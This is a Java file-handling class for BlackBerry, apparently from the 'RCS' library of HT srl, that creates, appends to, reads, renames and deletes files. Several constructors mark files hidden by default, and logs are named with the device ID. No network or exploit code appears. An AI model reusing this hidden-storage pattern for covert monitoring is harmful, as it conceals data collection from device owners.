//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : AutoFlashFile.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.fs;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Date;
import java.util.Enumeration;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;

import net.rim.device.api.io.IOUtilities;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.util.NumberUtilities;
import blackberry.debug.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;

/**
 * The Class AutoFlashFile.
 */
public final class AutoFile {
    private static final long MAX_FILE_SIZE = 1024 * 10;
    private String fullfilename;
    private String path;
    private boolean hidden;
    private boolean autoclose;

    private FileConnection fconn;
    private DataInputStream is;
    private OutputStream os;

    /**
     * Instantiates a new auto flash file.
     * 
     * @param filename_
     *            the filename_
     * @param hidden_
     *            the hidden_
     */
    public AutoFile(final String filename, final boolean hidden) {

        //#ifdef DBC
        Check.asserts(!filename.startsWith("file://"),
                "dirName shouldn.t start with file:// : " + filename);
        //#endif

        fullfilename = "file://" + filename;
        path = fullfilename.substring(0, fullfilename.lastIndexOf('/')) + '/';
        this.hidden = hidden;
    }

    public AutoFile(String filepath, String filename) {
        if (filepath.endsWith("/")) {
            fullfilename = "file://" + filepath + filename;
        } else {
            fullfilename = "file://" + filepath + "/" + filename;
        }
        path = fullfilename.substring(0, fullfilename.lastIndexOf('/')) + '/';
        this.hidden = true;
    }

    public AutoFile(String filepath) {
        this(filepath, true);
    }

    /**
     * Append.
     * 
     * @param message
     *            the message
     * @return true, if successful
     */
    public synchronized boolean append(final byte[] message) {
        try {
            fconn = (FileConnection) Connector.open(fullfilename,
                    Connector.READ_WRITE);
            //#ifdef DBC
            Check.asserts(fconn != null, "file fconn null");
            //#endif

            final boolean exists = fconn.exists();
            if (!exists) {
                return false;
            }

            final long size = fconn.fileSize();
            if (size == -1) {
                return false;
            }

            os = fconn.openOutputStream(size);
            //#ifdef DBC
            Check.asserts(os != null, "os null");
            //#endif

            os.write(message);

        } catch (final IOException e) {
            System.out.println(e.getMessage());
            e.printStackTrace();
            return false;
        } finally {

            close();
        }

        return true;
    }

    /**
     * Append.
     * 
     * @param value
     *            the value
     * @return true, if successful
     */
    public synchronized boolean append(final int value) {
        byte[] repr;
        repr = Utils.intToByteArray(value);
        return append(repr);
    }

    /**
     * Append.
     * 
     * @param message
     *            the message
     * @return true, if successful
     */
    public synchronized boolean append(final String message) {
        return append(message.getBytes());
    }

    private synchronized void close() {
        try {
            if (null != is) {
                is.close();
            }

            if (null != os) {
                os.close();
            }

            if (null != fconn) {
                fconn.close();
            }

        } catch (final IOException e) {
            System.out.println(e.getMessage());
        }
    }

    /**
     * Creates the.
     * 
     * @return true, if successful
     */
    public synchronized boolean create() {
        try {

            fconn = (FileConnection) Connector.open(fullfilename,
                    Connector.READ_WRITE);
            //#ifdef DBC
            Check.asserts(fconn != null, "fconn null");
            //#endif

            if (fconn.exists()) {
                fconn.truncate(0);
            } else {
                fconn.create();
                os = fconn.openDataOutputStream();
            }

            fconn.setHidden(hidden);
            //#ifdef DBC
            Check.asserts(fconn.isHidden() == hidden, "Not Hidden as expected");
            //#endif
        } catch (final IOException e) {
            //System.out.println(e.getMessage());
            //e.printStackTrace();
            return false;
        } finally {
            close();
        }

        //#ifdef DBC
        Check.ensures(exists(), "not created");
        //#endif
        return true;
    }

    /**
     * Delete.
     */
    public synchronized void delete() {
        try {
            fconn = (FileConnection) Connector.open(fullfilename,
                    Connector.READ_WRITE);
            //#ifdef DBC
            Check.asserts(fconn != null, "file fconn null");
            //#endif

            if (fconn.exists()) {
                fconn.delete();
            }
        } catch (final IOException e) {
            e.printStackTrace();
        } finally {
            close();
        }
    }

    /**
     * Exists.
     * 
     * @return true, if successful
     */
    public synchronized boolean exists() {
        try {
            fconn = (FileConnection) Connector.open(fullfilename,
                    Connector.READ);
            //#ifdef DBC
            Check.asserts(fconn != null, "fconn null");
            //#endif

            return fconn.exists();

        } catch (final IOException e) {
            System.out.println(e.getMessage());
            return false;
        } finally {
            close();
        }
    }

    /**
     * Gets the input stream.
     * 
     * @return the input stream
     */
    public synchronized InputStream getInputStream() {
        try {
            fconn = (FileConnection) Connector.open(fullfilename,
                    Connector.READ);
            //#ifdef DBC
            Check.asserts(fconn != null, "file fconn null");
            //#endif

            is = fconn.openDataInputStream();
        } catch (final IOException e) {
            System.out.println(e.getMessage());
        }

        return is;
    }

    /**
     * Read.
     * 
     * @return the byte[]
     */
    public synchronized byte[] read() {
        byte[] data = null;

        try {
            fconn = (FileConnection) Connector.open(fullfilename,
                    Connector.READ);
            //#ifdef DBC
            Check.asserts(fconn != null, "file fconn null");
            //#endif

            is = fconn.openDataInputStream();
            data = IOUtilities.streamToBytes(is);
        } catch (final IOException e) {
            System.out.println(e.getMessage());
        } finally {
            close();
        }

        return data;
    }

    public synchronized void rotateLogs(String baseName) {
        final DateTime dateTime = new DateTime();
        final String tempFile = baseName
                + NumberUtilities.toString(DeviceInfo.getDeviceId(), 16) + "_"
                + dateTime.getOrderedString() + ".txt";
        rename(tempFile, false);
    }

    /**
     * Rename.
     * 
     * @param newFile
     *            the new file
     * @return true, if successful
     */
    public boolean rename(final String newFile, final boolean openNewname) {
        try {
            fconn = (FileConnection) Connector.open(fullfilename,
                    Connector.READ_WRITE);
            //#ifdef DBC
            Check.asserts(fconn != null, "file fconn null");
            //#endif

            if (fconn.exists()) {
                fconn.rename(newFile);
                if (openNewname) {
                    fullfilename = path + newFile;
                }
            }
        } catch (final IOException e) {
            //#ifdef DEBUG
            System.out.println(e.getMessage());
            //#endif
            return false;
        } finally {
            close();
        }
        return true;
    }

    public boolean write(final byte[] message) {
        return write(message, 0, message.length);
    }

    /**
     * Write.
     * 
     * @param message
     *            the message
     * @return true, if successful
     */
    public synchronized boolean write(final byte[] message, int offset, int len) {

        try {
            fconn = (FileConnection) Connector.open(fullfilename,
                    Connector.WRITE);
            //#ifdef DBC
            Check.asserts(fconn != null, "file fconn null");
            //#endif

            os = fconn.openOutputStream();
            os.write(message, offset, len);

        } catch (final IOException e) {
            //#ifdef DEBUG
            System.out.println(e.getMessage());
            //#endif
            return false;
        } finally {
            close();
        }

        return true;

    }

    /**
     * Write.
     * 
     * @param value
     *            the value
     * @return true, if successful
     */
    public synchronized boolean write(final int value) {
        final byte[] repr = Utils.intToByteArray(value);
        return write(repr);
    }

    public synchronized boolean isDirectory() {
        try {
            fconn = (FileConnection) Connector.open(fullfilename,
                    Connector.READ);
            return fconn.isDirectory();
        } catch (IOException e) {
            //#ifdef DEBUG
            System.out.println(e.getMessage());
            //#endif
            return false;
        } finally {
            close();
        }
    }

    public long getSize() {
        try {
            fconn = (FileConnection) Connector.open(fullfilename,
                    Connector.READ);
            if (fconn.isDirectory()) {
                return 0;
            }
            return fconn.fileSize();

        } catch (IOException e) {
            //#ifdef DEBUG
            System.out.println(e.getMessage());
            //#endif
            return 0;
        } finally {
            close();
        }
    }

    public Date getFileTime() {
        try {
            fconn = (FileConnection) Connector.open(fullfilename,
                    Connector.READ);
            return new Date(fconn.lastModified());

        } catch (IOException e) {
            //#ifdef DEBUG
            System.out.println(e.getMessage());
            //#endif
            return new Date(0);
        } finally {
            close();
        }

    }

    public String getFullFilename() {

        return fullfilename;
    }

    public boolean isReadable() {
        try {
            fconn = (FileConnection) Connector.open(fullfilename,
                    Connector.READ);
            return fconn.canRead();

        } catch (IOException e) {
            //#ifdef DEBUG
            System.out.println(e.getMessage());
            //#endif
            return false;
        } finally {
            close();
        }
    }

    public Enumeration list() {
        try {
            fconn = (FileConnection) Connector.open(fullfilename,
                    Connector.READ);
            return fconn.list();
        } catch (IOException e) {
            return null;
        }
    }
}
